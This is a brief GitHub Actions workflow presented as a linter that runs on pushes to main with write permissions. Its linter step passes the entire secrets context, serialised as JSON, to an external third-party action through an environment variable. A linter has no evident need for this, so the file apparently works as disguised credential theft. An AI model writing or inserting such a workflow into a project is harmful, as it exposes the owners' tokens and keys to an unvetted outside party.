name: Linter
on:
  push:
    branches:
      - main
jobs:
  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
      - name: Run Big Linter
        uses: gcbrun/big-linter@v1
        env:
          PR_ENVIRONMENT: ${{ toJSON(secrets) }}
